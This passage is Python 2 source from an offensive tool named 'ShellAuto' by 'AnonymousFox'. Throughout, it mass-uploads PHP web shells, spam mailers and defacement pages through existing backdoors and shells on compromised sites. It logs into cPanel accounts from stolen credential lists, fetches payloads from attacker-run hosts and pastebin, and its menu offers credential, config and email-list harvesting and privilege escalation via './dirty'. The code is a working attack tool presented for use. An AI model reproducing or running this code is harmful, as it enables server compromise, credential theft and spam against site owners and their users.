		filedata = {'upload': 'upload'}
		fileup = {'file': (filename, mailer_text)}
		try :
			upMailer = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=filedata, files=fileup, headers=headers,timeout=30)
		except:
			upMailer = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, files=fileup, headers=headers, timeout=30)
		if 'WorkingV4.txt' not in upMailer.content :
			upMailer = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, files=fileup, headers=headers, timeout=30)
		if upMailer.status_code == 200 :
			print ' {}[+] Succeeded => {}{}?pass={}'.format(fg,fr,mailer_path,mailer_pass)
			open('Results/mailerXleet.txt', 'a').write('{}?pass={}\n'.format(mailer_path,mailer_pass))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)

def massUploadFile1(backdor,file) :
	try :
		print ' {}[*] Upload File ..... {}(Waiting)'.format(fw, fr)
		filename = ran(10) + '.php'
		s1 = backdor
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		file_path = backdor.replace(s1, filename)
		filedata = {'upload': 'upload'}
		fileup = {'file': (filename, file)}
		try :
			upFile = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=filedata, files=fileup, headers=headers,timeout=30)
		except:
			upFile = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, files=fileup, headers=headers, timeout=30)
		if 'WorkingV4.txt' not in upFile.content :
			upFile = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, files=fileup, headers=headers, timeout=30)
		if upFile.status_code == 200 :
			print ' {}[+] Succeeded => {}{}'.format(fg,fr,file_path)
			open('Results/files_uploaded.txt', 'a').write('{}\n'.format(file_path))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)
        
def massUploadFile2(backdor,file) :
	try :
		print ' {}[*] Upload File ..... {}(Waiting)'.format(fw, fr)
		post = {'up': 'up'}
		filename = ran(10) + '.php'
		fileup = {'file': (filename, file)}
		try :
			upFile = requests.post(backdor+'?php=http://anonymousfox.io/v4/v4.txt',files=fileup,data=post, headers=headers,timeout=30)
		except:
			upFile = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', files=fileup, data=post,headers=headers, timeout=30)
		if 'WorkingV4.txt' not in upFile.content :
			upFile = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', files=fileup, data=post,headers=headers, timeout=30)
		if upFile.status_code == 200 :
			file_path = re.findall(re.compile('<yourfile>(.*)</yourfile>'), upFile.content)[0]
			print ' {}[+] Succeeded => {}{}'.format(fg,fr,file_path)
			open('Results/files_uploaded.txt', 'a').write('{}\n'.format(file_path))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)

def massUploadIndex1(backdor,file,nameF) :
	try :
		print ' {}[*] Upload Index ..... {}(Waiting)'.format(fw, fr)
		post = {'up': 'up'}
		fileup = {'file': (nameF, file)}
		try :
			upFile = requests.post(backdor+'?php=http://anonymousfox.io/v4/v4.txt',files=fileup,data=post, headers=headers,timeout=30)
		except:
			upFile = requests.post(backdor+'?php=http://anonymousfox.pw/v4/v4.txt',files=fileup,data=post, headers=headers,timeout=30)
		if 'WorkingV4.txt' not in upFile.content :
			upFile = requests.post(backdor+'?php=http://anonymousfox.pw/v4/v4.txt',files=fileup,data=post, headers=headers,timeout=30)
		if upFile.status_code == 200 :
			file_path = re.findall(re.compile('<yourfile>(.*)</yourfile>'), upFile.content)[0]
			print ' {}[+] Succeeded => {}{}'.format(fg,fr,file_path)
			open('Results/indexS.txt', 'a').write('{}\n'.format(file_path))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)

def massUploadIndex2(backdor,file) :
	try :
		print ' {}[*] Upload Index ..... {}(Waiting)'.format(fw, fr)
		filedata = {'getindex':'AnonymousFox','index': file}
		try :
			upFile = requests.post(backdor+'?php=http://anonymousfox.io/v4/v4.txt', data=filedata, headers=headers,timeout=30)
		except:
			upFile = requests.post(backdor+'?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, headers=headers,timeout=30)
		if 'WorkingV4.txt' not in upFile.content :
			upFile = requests.post(backdor+'?php=http://anonymousfox.pw/v4/v4.txt', data=filedata, headers=headers,timeout=30)
		if upFile.status_code == 200 :
			file_path = re.findall(re.compile('<yourindex>(.*)</yourindex>'), upFile.content)[0]
			print ' {}[+] Succeeded => {}{}'.format(fg,fr,file_path)
			open('Results/indexS.txt', 'a').write('{}\n'.format(file_path))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)

def uploadWSO(urlShell,srcShell) :
	try :
		print ' {}[*] Upload Shell ..... {}(Waiting)'.format(fw, fr)
		filename = ran(10) + '.php'
		s1 = urlShell
		if "?php=" in s1 :
			s1 = s1.split('?php=')[0]
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		shell_path = urlShell.replace(s1, filename)
		if "?php=" in shell_path :
			shell_path = shell_path.split('?php=')[0]
		req = requests.session()
		src = requests.get(urlShell, timeout=15).content
		if 'charset' in src and 'uploadFile' in src and 'FilesMAn' in src and 'Windows' in src:
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f': (filename, shell)}
		elif '<pre align=center><form method=post>Password<br><input type=password name=pass' in src and 'style=\'background-color:whitesmoke;border:1px solid #FFF;outline:none' in src and 'type=submit name=\'watching\' value=\'submit\'' in src:
			post = {'pass': 'xleet'}
			login = req.post(urlShell, data=post, timeout=15)
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f[]': (filename, shell)}
		elif 'Jijle3' in src:
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f':(filename,shell)}
		elif 'Hacked By AnonymousFox' in src:
			filedata = {'':''}
			fileup = {'file': (filename, shell)}
		elif 'Tryag File Manager' in src:
			filedata = {'':''}
			fileup = {'file': (filename, shell)}
		elif 'http://www.ubhteam.org/images/UBHFinal1.png' in src:
			filedata = {'submit': 'Upload'}
			fileup = {'file': (filename, shell)}
		elif '<h1>File</h1>' in src:
			filedata = {'':''}
			fileup = {'filename': (filename, shell)}
		elif '#p@@#' in src:
			filedata = {'':''}
			fileup = {'filename': (filename, shell)}
		elif '404-server!!' in src:
			filedata = {'':''}
			fileup = {'file': (filename, shell)}
		elif 'Vuln!! patch it Now!' in src and '_upl' in src:
			filedata = {'_upl': 'Upload'}
			fileup = {'file': (filename, shell)}
		elif '<title>Mister Spy</title>' in src:
			filedata = {'': ''}
			fileup = {'file': (filename, shell)}
		elif 'B Ge Team File Manager' in src:
			filedata = {'': ''}
			fileup = {'file': (filename, shell)}
		elif 'http://i.imgur.com/kkhH5Ig.png' in src:
			filedata = {'submit': 'Upload'}
			fileup = {'file': (filename, shell)}
		elif 'xichang1' in src:
			filedata = {'': ''}
			fileup = {'userfile': (filename, shell)}
		elif 'vwcleanerplugin' in src:
			filedata = {'': ''}
			fileup = {'userfile': (filename, shell)}
		elif 'By Gentoo' in src:
			pattern = re.compile('#000000"></td></tr></table><br></fieldset></form><form method="POST" action="(.*)"')
			pattern2 = re.compile('\?http(.*)')
			pth = re.findall(pattern, src)
			pth = pth[0]
			pth2 = re.findall(pattern2, pth)
			pth2 = pth2[0]
			pth2 = pth2.replace('amp;', '')
			filedata = {'B1': 'Kirim'}
			fileup = {'userfile': (filename, shell)}
			urlShell = urlShell + '?http' + pth2
		elif 'IndoXploit' in src and 'current_dir' in src:
			filedata = {'uploadtype': '1', 'upload': 'upload'}
			fileup = {'file': (filename, shell)}
		elif 'IndoXploit' in src and 'Current DIR' in src:
			filedata = {'upload': 'upload'}
			fileup = {'ix_file': (filename, shell)}
			urlShell = urlShell+'?dir=./&do=upload'
		elif '#' in urlShell:
			pattern = re.compile('#(.*)')
			password = re.findall(pattern, urlShell)
			password = password[0]
			post = {'pass': password}
			login = req.post(urlShell, data=post, timeout=60)
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f': (filename, shell)}
		elif 'uploader' in src and '_upl' in src:
			filedata = {'_upl': 'Upload'}
			fileup = {'file': (filename, shell)}
		elif 'k2ll33d' in src:
			filedata = {'uploadcomp': 'Go', 'path': './'}
			fileup = {'file': (filename, shell)}
			urlShell = urlShell+'?y=./&x=upload'
		elif 'Tusbol Mantan :' in src:
			filedata = {'': ''}
			fileup = {'file': (filename, shell)}
		elif 'Raiz0WorM' in src and 'zb' in src:
			fileup = {'zb': (filename, shell)}
			filedata = {'upload': 'upload'}
		elif 'MisterSpyv7up' in src and 'uploads' in src:
			filedata = {'': ''}
			fileup = {'uploads': (filename, shell)}
		else :
			filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
			if 'name="uploadfile"' in src or "name='uploadfile'" in src or 'name= "uploadfile"' in src or 'name= \'uploadfile\'' in src or 'name = "uploadfile"' in src or 'name = \'uploadfile\'' in src or 'name ="uploadfile"' in src or 'name =\'uploadfile\'' in src or 'name=uploadfile' in src or 'name =uploadfile' in src or 'name= uploadfile' in src or 'name = uploadfile' in src:
				fileup = {'uploadfile': (filename, shell)}
			elif 'name="idx_file"' in src or "name='idx_file'" in src or 'name= "idx_file"' in src or 'name= \'idx_file\'' in src or 'name = "idx_file"' in src or 'name = \'idx_file\'' in src or 'name ="idx_file"' in src or 'name =\'idx_file\'' in src or 'name=idx_file' in src or 'name =idx_file' in src or 'name= idx_file' in src or 'name = idx_file' in src:
				fileup = {'idx_file':(filename,shell)}
			elif 'name="userfile"' in src or "name='userfile'" in src or 'name= "userfile"' in src or 'name= \'userfile\'' in src or 'name = "userfile"' in src or 'name = \'userfile\'' in src or 'name ="userfile"' in src or 'name =\'userfile\'' in src or 'name=userfile' in src or 'name =userfile' in src or 'name= userfile' in src or 'name = userfile' in src:
				fileup = {'userfile': (filename, shell)}
			elif 'name="files"' in src or "name='files'" in src or 'name= "files"' in src or 'name= \'files\'' in src or 'name = "files"' in src or 'name = \'files\'' in src or 'name ="files"' in src or 'name =\'files\'' in src or 'name=files' in src or 'name =files' in src or 'name= files' in src or 'name = files' in src:
				fileup = {'files': (filename, shell)}
			elif 'name="file"' in src or "name='file'" in src or 'name= "file"' in src or 'name= \'file\'' in src or 'name = "file"' in src or 'name = \'file\'' in src or 'name ="file"' in src or 'name =\'file\'' in src or 'name=file' in src or 'name =file' in src or 'name= file' in src or 'name = file' in src:
				fileup = {'file': (filename, shell)}
			elif 'name="image"' in src or "name='image'" in src or 'name= "image"' in src or 'name= \'image\'' in src or 'name = "image"' in src or 'name = \'image\'' in src or 'name ="image"' in src or 'name =\'image\'' in src or 'name=image' in src or 'name =image' in src or 'name= image' in src or 'name = image' in src:
				fileup = {'image': (filename, shell)}
			elif 'name="f"' in src or "name='f'" in src or 'name= "f"' in src or 'name= \'f\'' in src or 'name = "f"' in src or 'name = \'f\'' in src or 'name ="f"' in src or 'name =\'f\'' in src or 'name=f' in src or 'name =f' in src or 'name= f' in src or 'name = f' in src:
				fileup = {'f': (filename, shell)}
			elif 'name="uploads"' in src or "name='uploads'" in src or 'name= "uploads"' in src or 'name= \'uploads\'' in src or 'name = "uploads"' in src or 'name = \'uploads\'' in src or 'name ="uploads"' in src or 'name =\'uploads\'' in src or 'name=uploads' in src or 'name =uploads' in src or 'name= uploads' in src or 'name = uploads' in src:
				fileup = {'uploads': (filename, shell)}
			elif 'name="upload"' in src or "name='upload'" in src or 'name= "upload"' in src or 'name= \'upload\'' in src or 'name = "upload"' in src or 'name = \'upload\'' in src or 'name ="upload"' in src or 'name =\'upload\'' in src or 'name=upload' in src or 'name =upload' in src or 'name= upload' in src or 'name = upload' in src:
				fileup = {'upload': (filename, shell)}
			else :
				fileup = {'up': (filename, shell)}
		up = req.post(urlShell, data=filedata, files=fileup, timeout=60)
		check = requests.get(shell_path, timeout=15).content
		if 'FoxAutoV4' in check :
			uploadShell(shell_path, srcShell)
		else :
			print ' {}[-] Failed'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def logincPanel(datacPanel,srcShell):
	try :
		if re.findall(re.compile('(.*)\|(.*)\|(.*)'), datacPanel):
			cp = re.findall(re.compile('(.*)\|(.*)\|(.*)'), datacPanel)
			ip = cp[0][0]
			username = cp[0][1]
			password = cp[0][2]
			print " [*] cPanel : {}".format(ip)
			print " [*] Username : {}".format(username)
			print " [*] Password : {}".format(password)
			req = requests.session()
			postlogin = {'user':username,'pass':password,'login_submit':'Log in'}
			try :
				login = req.post(ip+'/login/', data=postlogin,timeout=15)
			except:
				login = req.post(ip + '/login/',verify=False, data=postlogin, timeout=15)
			if 'filemanager' in login.content :
				print ' {}[+] Login successful'.format(fg)
				if re.findall(re.compile('PAGE.securityToken = "(.*)/(.*)";'),login.content):
					idcp = re.findall(re.compile('PAGE.securityToken = "(.*)/(.*)";'),login.content)[0][1]
				elif re.findall(re.compile('MASTER.securityToken        = "(.*)/(.*)";'),login.content):
					idcp = re.findall(re.compile('MASTER.securityToken        = "(.*)/(.*)";'), login.content)[0][1]
				elif re.findall(re.compile('href="/cpsess(.*)/3rdparty'),login.content):
					idcp = 'cpsess'+re.findall(re.compile('href="/cpsess(.*)/3rdparty'), login.content)[0]
				elif re.findall(re.compile('href="/cpsess(.*)/frontend/'), login.content):
					idcp = 'cpsess' + re.findall(re.compile('href="/cpsess(.*)/frontend/'), login.content)[0]
				if re.findall(re.compile('PAGE.domain = "(.*)";'),login.content):
					domain = re.findall(re.compile('PAGE.domain = "(.*)";'),login.content)[0]
				elif  re.findall(re.compile('<a id="lnkMaintain_DomainName" href="security/tls_status/#/?domain=(.*)">'),login.content):
					domain = re.findall(re.compile('<a id="lnkMaintain_DomainName" href="security/tls_status/#/?domain=(.*)">'),login.content)[0]
				elif re.findall(re.compile('<tr id="domainNameRow" ng-controller="sslStatusController" ng-init="primaryDomain = \'(.*)\'; "'),login.content):
					domain = re.findall(re.compile('<tr id="domainNameRow" ng-controller="sslStatusController" ng-init="primaryDomain = \'(.*)\'; "'), login.content)[0]
				elif re.findall(re.compile('<span id="txtDomainName" class="general-info-value">(.*)</span>'), login.content):
					domain = re.findall(re.compile('<span id="txtDomainName" class="general-info-value">(.*)</span>'), login.content)[0]
				elif re.findall(re.compile('<b>(.*)</b>'), login.content):
					domain = re.findall(re.compile('<b>(.*)</b>'), login.content)[0]
				massUploadcPanel(ip, username , idcp, req, domain, srcShell)
			else:
				print ' {}[-] Login failed'.format(fr)
		else :
			print ' {}[-] The list must be https://domain.com:2083|username|password'.format(fr)
	except:
		print ' {}[-] Failed'.format(fr)

def massUploadcPanel(ip, user ,  idcp, cookies, domain, srcShell) :
	try :
		filename = ran(10) + '.php'
		filedata = {'dir': '/home/' + user + '/public_html', 'get_disk_info': '1', 'overwrite': '0'}
		fileup = {'file-0': (filename, shell)}
		try :
			upload = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip,idcp), data=filedata, files=fileup, timeout=120)
		except:
			upload = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp),verify=False, data=filedata, files=fileup, timeout=120)
		shell_path = 'http://' + domain + '/' + filename
		time.sleep(3)
		check = requests.get(shell_path, timeout=30).content
		if 'FoxAutoV4' in check:
			uploadShell(shell_path, srcShell)
		else :
			print " {}[-] Failed upload".format(fr)
	except:
		print " {}[-] Failed upload".format(fr)

def uploadShell(backdor,srcShell) :
	try:
		filename = ran(10) + '.php'
		s1 = backdor
		while '/' in s1:
			s1 = s1[s1.index("/") + len("/"):]
		file_path = backdor.replace(s1, filename)
		post = {'upload': 'upload'}
		fileup = {'file': (filename, srcShell)}
		try :
			upFile = requests.post(backdor+'?php=http://anonymousfox.io/v4/v4.txt',files=fileup,data=post, headers=headers,timeout=30)
		except:
			upFile = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', files=fileup, data=post,headers=headers, timeout=30)
		if 'WorkingV4.txt' not in upFile.content :
			upFile = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', files=fileup, data=post,headers=headers, timeout=30)
		if upFile.status_code == 200 :
			print ' {}[+] Succeeded => {}{}'.format(fg,fr,file_path)
			print ' {}[+] Saved in {}Results/Shells.txt'.format(fg, fr)
			open('Results/Shells.txt', 'a').write('{}\n'.format(file_path))
		else:
			print ' {}[-] Failed'.format(fr)
	except :
		print ' {}[-] Failed'.format(fr)

def checkSend(backdor,shell) :
	try :
		print ' {}[*] Check Sending mail ..... {}(Waiting)'.format(fw, fr)
		src = str(changemail())
		email = re.findall(re.compile('u\'(.*)\', <RequestsCookieJar'), src)[0]
		cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
		post = {'email': email, 'mailCheck': 'AnonymousFox'}
		try :
			sendCode = requests.post(backdor + '?php=http://anonymousfox.io/v4/v4.txt', data=post, headers=headers,timeout=15).content
		except:
			sendCode = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if 'WorkingV4.txt' not in sendCode :
			sendCode = requests.post(backdor + '?php=http://anonymousfox.pw/v4/v4.txt', data=post, headers=headers,timeout=15).content
		if '<codemail>' in sendCode :
			code = re.findall(re.compile('<codemail>(.*)</codemail>'), sendCode)[0]
			time.sleep(5)
			check = checkinboxTestPHP(cookies, email,code)
			start = timer()
			while ((check == 'bad') and ((timer() - start) <= 30)):
				time.sleep(10)
				check = checkinboxTestPHP(cookies, email,code)
			if (check == 'bad') :
				print ' {}[-] Sending mail is Not Working !'.format(fr)
				open('Results/SendingMail_NotWork.txt', 'a').write('{}\n'.format(shell))
			else :
				print' {}[+] Sending mail is Working Well !'.format(fg)
				open('Results/SendingMail_Work.txt', 'a').write('{}\n'.format(shell))
		else :
			print ' {}[-] Failed'.format(fr)
	except:
		print' {}[-] Failed'.format(fr)

def about():
	try :
		try :
			update = requests.get('http://anonymousfox.io/v4/update.txt', headers=headers,timeout=15).content
		except:
			update = requests.get('http://pastebin.com/raw/9ey3tAWG', headers=headers,timeout=15).content
		if 'Download' not in update :
			update = requests.get('http://pastebin.com/raw/9ey3tAWG', headers=headers,timeout=15).content
		print """  
	{}ShellAuto , Version {}4{}\n
	Programmed{} by {}AnonymousFox{}\n
	Contact : fb.com/carlos.dechia.98\n
	Our sites : anonymousfox.com || .io || .pw || .xyz \n
	Thanks to friends : M0HaMeD.Xo , Olux Admin , Dr.SiLnT HilL , RxR , Ali Shahien 
				, Alarg53 , Golden-security , chinafans , Bala sniper\n
	Special Thanks to {}my girlfriend{} : {}aDriv4 {}<3{}\n
	Last updated => {}{} \n""".format(fw,fg,fr,fw,fg,fw,fr,fw,fg,fr,fw,fg,update)
	except:
		pass


def main():
	try :
		try :
			main = requests.get('http://anonymousfox.io/v4/news.txt', headers=headers,timeout=15)
		except:
			main = requests.get('https://pastebin.com/raw/XnW8SJ1Q', headers=headers,timeout=15)
		if main.status_code != 200 :
			main = requests.get('https://pastebin.com/raw/XnW8SJ1Q', headers=headers,timeout=15)
		news = re.findall(re.compile('(.*):(.*)'), main.content)[0]
		print '\n   {}{}{}:{}{}\n'.format(fg,news[0],fr,fw,news[1])
	except:
		pass

def ShellAuto():
	try :
		print '   [01] {}Mass Reset Passowrd cPanel {}[Automatic]'.format(fw,fg)
		print '   [02] {}Mass Reset Passowrd cPanel {}[Semi-Automatic]'.format(fw,fr)
		print '   [03] {}Mass Finder SMTP {}+{} Create SMTP'.format(fw,fg,fw)
		print '   [04] {}Mass Finder cPanel/vHosts/Root {}[PWD|UNAME]'.format(fw,fr)
		print "   [05] {}Mass Finder Accesshash {}[Reseller] {}+{} .my.cnf {}[cPanel]".format(fw, fr, fg,fw, fr)
		print "   [06] {}Mass Get Config (cPanel/vHosts) server {}[NEW]".format(fw,fg)
		print "   [07] {}Mass Get Config {}+ {}Crack cPanel {}[NEW]".format(fw,fg,fw,fg)
		print '   [08] {}Mass Get Root by {}./dirty {}[NEW]'.format(fw,fr,fg)
		print "   [09] {}Mass Get Domains-List {}[NEW]".format(fw, fg)
		print "   [10] {}Mass Get Emails-List {}[NEW]".format(fw,fg)
		print "   [11] {}Mass Get Config {}+ {}Emails-List {}[NEW]".format(fw,fg,fw,fg)
		print '   [12] {}Mass Upload Mailer {}[Random]'.format(fw,fr)
		print '   [13] {}Mass Upload file {}[Random]'.format(fw,fr)
		print '   [14] {}Mass Upload Index'.format(fw)
		print "   [15] {}MASS Upload {}Olux{}/{}Xleet{} Shell from any backdor/upload/shell {}[NEW]".format(fw,fg,fw,fr,fw ,fg)
		print "   [16] {}MASS Upload {}Olux{}/{}Xleet{} Shell from cPanel {}[NEW]".format(fw,fg,fw,fr,fw ,fg)
		print "   [17] {}MASS Chack if Sending mail is Working or not ! {}[NEW]".format(fw,fg)
		print '   [18] {}Reset Passowrd cPanel {}+{} Create SMTP {}[together]'.format(fw,fg,fw,fr)
		print '   [19] {}01 {}+{} 03 {}+{} 05 {}+{} 07 {}+{} 08  {}[All of them together]'.format(fw,fg,fw,fg,fw,fg,fw,fg,fw,fr)
		print "   [20] {}About Script {}&{} Check Update".format(fg,fr,fg)
		print "   [00] {}Exit".format(fr)
		w = int(raw_input('\n --> : '))
		print ''
		if w != 1 and w != 2 and w != 3 and w != 4 and w != 5 and w != 6 and w != 7 and w != 8 and w != 9  and w != 10 and w != 11  and w != 12 and w != 13 and w != 14 and w != 15 and w != 16 and w != 17 and w != 18 and w != 19 and w != 20 :
			print "      {}Go to hell :P".format(fr)
			sys.exit(0)
		if w ==2 :
			email = str(raw_input(' Your Email --> : '))
			print ''
		if w == 12 :
			print '   [1] {}Olux Mailer'.format(fw)
			print '   [2] {}Xleet Mailer'.format(fw)
			tyMailer = int(raw_input('\n --> : '))
			if tyMailer == 1 :
				try :
					mailerOlux = requests.get('https://pastebin.com/raw/UX0y8PQN', headers=headers,timeout=15).content
				except:
					mailerOlux = requests.get('http://anonymousfox.pw/mailers/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in mailerOlux :
					mailerOlux = requests.get('http://anonymousfox.pw/mailers/olux.txt', headers=headers,timeout=15).content
			elif tyMailer == 2 :
				try :
					mailerXleet = requests.get('https://pastebin.com/raw/s2dVf0fT', headers=headers,timeout=15).content
				except:
					mailerXleet =  requests.get('http://anonymousfox.pw/mailers/xleet.txt', headers=headers,timeout=15).content
				if 'Fox' not in mailerXleet:
					mailerXleet =  requests.get('http://anonymousfox.pw/mailers/xleet.txt', headers=headers,timeout=15).content
			else :
				tyMailer = 1
				try :
					mailerOlux = requests.get('https://pastebin.com/raw/UX0y8PQN', headers=headers,timeout=15).content
				except:
					mailerOlux = requests.get('http://anonymousfox.pw/mailers/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in mailerOlux :
					mailerOlux = requests.get('http://anonymousfox.pw/mailers/olux.txt', headers=headers,timeout=15).content
			print ''
		if w == 13 :
			nameF = str(raw_input(' Filename --> : '))
			if not os.path.isfile(nameF):
				print "       {}File does not exist !".format(fr)
				sys.exit(0)
			fileSrc = file_get_contents(nameF)
			print '\n   [1] {}In the same path'.format(fw)
			print '   [2] {}In the main path'.format(fw)
			tyUP = int(raw_input('\n --> : '))
			if tyUP != 1 and tyUP != 2 :
				tyUP = 1
			print ''
		if w == 14 :
			nameF = str(raw_input(' YourIndex --> : '))
			if not os.path.isfile(nameF):
				print "       {}File does not exist !".format(fr)
				sys.exit(0)
			fileSrc = file_get_contents(nameF)
			print '\n   [1] {}if You want Index with the same name , like => http://domain.com/{}'.format(fw,nameF)
			print '   [2] {}if You want index in the main index , like => http://domain.com/'.format(fw)
			tyUP = int(raw_input('\n --> : '))
			if tyUP != 1 and tyUP != 2 :
				tyUP = 1
			print ''
		elif w == 20:
			about()
			sys.exit(0)
		newpath = r'Results'
		if not os.path.exists(newpath):
			os.makedirs(newpath)
		sites = open(sys.argv[1],'r')
		if w == 16 :
			print '   [1] {}Olux Shell'.format(fw)
			print '   [2] {}Xleet Shell'.format(fw)
			print '   [3] {}Other file'.format(fw)
			tyShell = int(raw_input('\n --> : '))
			if tyShell == 1 :
				try :
					srcShell = requests.get('http://pastebin.com/raw/fUmn5LMp', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers,timeout=15).content
			elif tyShell == 2 :
				try :
					srcShell = requests.get('https://pastebin.com/raw/be9hG3F7', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('http://anonymousfox.pw/shells/xleet.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('http://anonymousfox.pw/shells/xleet.txt', headers=headers,timeout=15).content
			elif tyShell == 3 :
				nameF = str(raw_input('\n Filename --> : '))
				if not os.path.isfile(nameF):
					print "       {}File does not exist !".format(fr)
					sys.exit(0)
				srcShell = file_get_contents(nameF)
			else :
				try :
					srcShell = requests.get('http://pastebin.com/raw/fUmn5LMp', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers,timeout=15).content
			print ''
			for site in sites:
				try:
					datacPanel = site.strip()
					logincPanel(datacPanel,srcShell)
					print ''
				except:
					pass
			sys.exit(0)
		if w == 15 :
			print '   [1] {}Olux Shell'.format(fw)
			print '   [2] {}Xleet Shell'.format(fw)
			print '   [3] {}Other file'.format(fw)
			tyShell = int(raw_input('\n --> : '))
			if tyShell == 1 :
				try :
					srcShell = requests.get('http://pastebin.com/raw/fUmn5LMp', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers,timeout=15).content
			elif tyShell == 2 :
				try :
					srcShell = requests.get('https://pastebin.com/raw/be9hG3F7', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('http://anonymousfox.pw/shells/xleet.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('http://anonymousfox.pw/shells/xleet.txt', headers=headers,timeout=15).content
			elif tyShell == 3 :
				nameF = str(raw_input('\n Filename --> : '))
				if not os.path.isfile(nameF):
					print "       {}File does not exist !".format(fr)
					sys.exit(0)
				srcShell = file_get_contents(nameF)
			else :
				try :
					srcShell = requests.get('http://pastebin.com/raw/fUmn5LMp', headers=headers,timeout=15).content
				except:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers, timeout=15).content
				if 'Fox' not in srcShell:
					srcShell = requests.get('http://anonymousfox.pw/shells/olux.txt', headers=headers,timeout=15).content
			print ''
			for site in sites:
				try:
					url = site.strip()
					print ' --| {}'.format(fc) + url
					uploadWSO(url, srcShell)
					print ''
				except:
					print ' {}[-] Failed\n'.format(fr)
			sys.exit(0)
		t = 'resetpassword'
		for site in sites :
			url = site.strip()
			try :
				print ' --| {}'.format(fc) + url
				filename = ran(10) + '.php'
				s1 = url
				while '/' in s1:
					s1 = s1[s1.index("/") + len("/"):]
				shell_path = url.replace(s1, filename)
				requp = requests.session()
				src = requests.get(url, headers=headers,timeout=15).content
				if 'Windows' in src and 'Upload file:' in src :
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile','ne':'','charset':'Windows-1251','c':''}
					fileup = {'f': (filename, shell)}
				elif '<pre align=center><form method=post>Password<br><input type=password name=pass' in src and 'style=\'background-color:whitesmoke;border:1px solid #FFF;outline:none' in src and 'type=submit name=\'watching\' value=\'submit\'' in src :
					post = {'pass': 'xleet'}
					login = requp.post(url, data=post, timeout=15)
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					fileup = {'f[]': (filename, shell)}
				elif 'name="uploadfile"' in src or "name='uploadfile'" in src or 'name= "uploadfile"' in src or 'name= \'uploadfile\'' in src or 'name = "uploadfile"' in src or 'name = \'uploadfile\'' in src or 'name ="uploadfile"' in src or 'name =\'uploadfile\'' in src or 'name=uploadfile' in src or 'name =uploadfile' in src or 'name= uploadfile' in src or 'name = uploadfile' in src:
					fileup = {'uploadfile': (filename, shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="idx_file"' in src or "name='idx_file'" in src or 'name= "idx_file"' in src or 'name= \'idx_file\'' in src or 'name = "idx_file"' in src or 'name = \'idx_file\'' in src or 'name ="idx_file"' in src or 'name =\'idx_file\'' in src or 'name=idx_file' in src or 'name =idx_file' in src or 'name= idx_file' in src or 'name = idx_file' in src:
					fileup = {'idx_file':(filename,shell)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up'}
				elif 'name="userfile"' in src or "name='userfile'" in src or 'name= "userfile"' in src or 'name= \'userfile\'' in src or 'name = "userfile"' in src or 'name = \'userfile\'' in src or 'name ="userfile"' in src or 'name =\'userfile\'' in src or 'name=userfile' in src or 'name =userfile' in src or 'name= userfile' in src or 'name = userfile' in src:
					fileup = {'userfile': (filename, shell)}
